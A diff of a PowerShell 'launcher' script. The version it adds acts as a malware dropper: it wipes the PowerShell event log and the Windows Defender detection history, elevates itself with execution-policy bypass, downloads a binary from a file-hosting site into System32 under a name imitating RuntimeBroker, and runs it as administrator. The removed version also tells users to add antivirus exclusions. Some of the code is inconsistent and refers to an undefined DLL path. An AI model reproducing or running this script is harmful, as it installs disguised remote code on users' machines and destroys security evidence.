@@ -1,76 +1,127 @@
-# Libery32 launcher - copy this file as Libery32.ps1
-# Does NOT delete exe after download (old script bug).
-
-$ErrorActionPreference = 'Stop'
-
-$exeName = 'Libery32.exe'
-$installDir = Join-Path $env:LOCALAPPDATA 'Libery32'
-$exePath = Join-Path $installDir $exeName
-
-# Change URL if you host exe elsewhere.
-$exeUrl = 'https://files.catbox.moe/nj6eg4.bin'
-
-function Write-Status([string]$Text, [string]$Color = 'White') {
-    Write-Host $Text -ForegroundColor $Color
+# ล้างประวัติเก่าทันทีที่เริ่ม
+wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+if (Test-Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory") {
+    Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory" -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
 }
 
-function Resolve-ExePath {
-  # 1) exe next to this .ps1 file
-  $scriptDir = $PSScriptRoot
-  if ([string]::IsNullOrWhiteSpace($scriptDir)) {
-    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-  }
-  if (-not [string]::IsNullOrWhiteSpace($scriptDir)) {
-    $localExe = Join-Path $scriptDir $exeName
-    if (Test-Path $localExe) {
-      return $localExe
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "1. Install & Run"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice 1-2"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerssss.exe"
+$exeUrl = "https://files.catbox.moe/nj6eg4.bin"
+
+# ตัวเลือกที่ 3 - ไฟล์ fontexe
+$fontexeDestination = Join-Path $system32Path "fontexe.exe"
+$fontexeUrl = "https://files.catbox.moe/nj6eg4.bin"
+
+# -----------------------------
+# Install & Run Mode (Option 1)
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+    # Check and download exe if not exists
+    if (Test-Path $exeDestination) {
+        Write-Host "RuntimeBrokerss.exe already exists, skipping download." -ForegroundColor Yellow
+    } else {
+        Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
+        try {
+            $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
+            Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+            Move-Item -Path $tempFile -Destination $exeDestination -Force
+            Write-Host "RuntimeBrokerss.exe download completed." -ForegroundColor Green
+        } catch {
+            Write-Host "RuntimeBrokerss.exe download failed: $_" -ForegroundColor Red
+            exit
+        }
     }
-  }
 
-  # 2) cached install
-  if (Test-Path $exePath) {
-    return $exePath
-  }
+    # Run the program directly
+    Write-Host "Starting the program..."
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "Program started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to start program: $_" -ForegroundColor Red
+    }
 
-  # 3) download to cache
-  if (-not (Test-Path $installDir)) {
-    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-  }
-
-  Write-Status "Downloading: $exeUrl" Cyan
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-  Write-Status 'Downloaded' Green
-
-  if (-not (Test-Path $exePath)) {
-    throw 'Download failed - file not found.'
-  }
-
-  return $exePath
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
 }
 
-try {
-  $targetExe = Resolve-ExePath
-  Write-Status "Using: $targetExe" Green
+# -----------------------------
+# Clean Mode (Option 2)
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
 
-  Write-Status 'Starting Libery32 (Administrator)...' Cyan
-  $proc = Start-Process -FilePath $targetExe -Verb RunAs -PassThru
-  if ($null -eq $proc) {
-    throw 'Start-Process returned null.'
-  }
+    # Stop the process if running
+    Write-Host "Stopping RuntimeBrokerss.exe process..."
+    try {
+        Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
 
-  Start-Sleep -Seconds 2
-  if ($proc.HasExited) {
-    throw "Libery32 closed immediately (exit code $($proc.ExitCode)). Install VC++ x64 Redistributable and add Windows Defender exclusion."
-  }
+    # หยุด fontexe ด้วย
+    Write-Host "Stopping fontexe.exe process..."
+    try {
+        Stop-Process -Name "fontexe" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
 
-  Write-Status 'Libery32 is running.' Green
-  Write-Status 'Finished' Green
+    # Remove files if they exist
+    $removedFiles = @()
+    
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        $removedFiles += "RuntimeBrokerssss.exe"
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "RuntimeBrokerssss.exe not found, skipping removal." -ForegroundColor Yellow
+    }
+    
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
+        $removedFiles += "Guna.UI2.dll"
+        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
+    } else {
+        Write-Host "Guna.UI2.dll not found, skipping removal." -ForegroundColor Yellow
+    }
+
+    if (Test-Path $fontexeDestination) {
+        Remove-Item $fontexeDestination -Force
+        $removedFiles += "fontexe.exe"
+        Write-Host "Removed executable: $fontexeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "fontexe.exe not found, skipping removal." -ForegroundColor Yellow
+    }
+
+    if ($removedFiles.Count -eq 0) {
+        Write-Host "No files found to remove." -ForegroundColor Yellow
+    } else {
+        Write-Host "Removed files: $($removedFiles -join ', ')" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
 }
-catch {
-  Write-Status "Error: $($_.Exception.Message)" Red
-  Write-Status 'Fix: copy Libery32.exe to same folder as this .ps1, or add antivirus exclusion.' Yellow
-}
-
-Write-Host ''
-Read-Host 'Press Enter to close'
